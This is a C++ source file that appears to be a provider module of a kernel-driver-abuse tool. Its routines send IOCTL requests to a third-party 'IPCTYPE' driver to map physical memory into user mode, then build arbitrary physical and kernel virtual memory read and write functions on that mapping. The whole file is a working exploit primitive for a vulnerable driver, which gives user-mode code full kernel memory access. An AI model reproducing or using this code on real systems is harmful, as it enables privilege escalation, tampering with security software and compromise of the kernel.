/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2026
*
*  TITLE:       IPCDEC.CPP
*
*  VERSION:     1.48
*
*  DATE:        25 Mar 2026
*
*  IPCTYPE driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/ipcdec.h"

/*
* IpcMapMemory
*
* Purpose:
*
* Map physical memory to the user mode (MmMapIoSpace + MmMapLockedPagesSpecifyCache).
*
*/
PVOID IpcMapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes)
{
    IPCTYPE_MAP_MEMORY request = { 0 };
    request.Length = NumberOfBytes;
    request.PhysicalAddress.QuadPart = PhysicalAddress;

    if (supCallDriver(DeviceHandle,
        IOCTL_IPCTYPE_MAPBUFFER,
        &request,
        sizeof(request),
        &request,
        sizeof(request)))
    {
        return (PVOID)request.UserMapping;
    }

    return NULL;
}

/*
* IpcUnmapMemory
*
* Purpose:
*
* Unmap previously mapped physical memory.
*
*/
VOID IpcUnmapMemory(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID SectionToUnmap)
{
    IPCTYPE_UNMAP_MEMORY request = { 0 };
    request.UserMapping = (ULONGLONG)SectionToUnmap;

    supCallDriver(DeviceHandle,
        IOCTL_IPCTYPE_UNMAPBUFFER,
        &request,
        sizeof(request),
        NULL,
        0);
}

/*
* IpcVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI IpcVirtualToPhysical(
    HANDLE DeviceHandle,
    ULONG_PTR VirtualAddress,
    ULONG_PTR* PhysicalAddress)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return supVirtualToPhysicalWithSuperfetch(VirtualAddress, PhysicalAddress);
}

/*
* IpcReadPhysicalMemory
*
* Purpose:
*
* Read from physical memory.
*
*/
BOOL WINAPI IpcReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR pageBase, offset;
    ULONG_PTR  mapSize;

    pageBase = PhysicalAddress & ~(PAGE_SIZE - 1);
    offset = PhysicalAddress - pageBase;
    mapSize = offset + NumberOfBytes;

    mappedSection = IpcMapMemory(DeviceHandle, pageBase, (ULONG)mapSize);
    if (mappedSection) {

        __try {

            RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            bResult = TRUE;

        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        IpcUnmapMemory(DeviceHandle, mappedSection);
    }
    else {
        dwError = GetLastError();
    }
    SetLastError(dwError);
    return bResult;
}

/*
* IpcWritePhysicalMemory
*
* Purpose:
*
* Write to physical memory.
*
*/
BOOL WINAPI IpcWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;
    ULONG_PTR pageBase, offset;
    ULONG_PTR mapSize;

    pageBase = PhysicalAddress & ~(PAGE_SIZE - 1);
    offset = PhysicalAddress - pageBase;
    mapSize = offset + NumberOfBytes;

    mappedSection = IpcMapMemory(DeviceHandle, pageBase, (ULONG)mapSize);
    if (mappedSection) {

        __try {

            RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            bResult = TRUE;

        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        IpcUnmapMemory(DeviceHandle, mappedSection);
    }
    else {
        dwError = GetLastError();
    }
    SetLastError(dwError);
    return bResult;
}

/*
* IpcWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI IpcWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supWriteKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        IpcWritePhysicalMemory);
}

/*
* IpcReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
BOOL WINAPI IpcReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supReadKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        IpcReadPhysicalMemory);
}
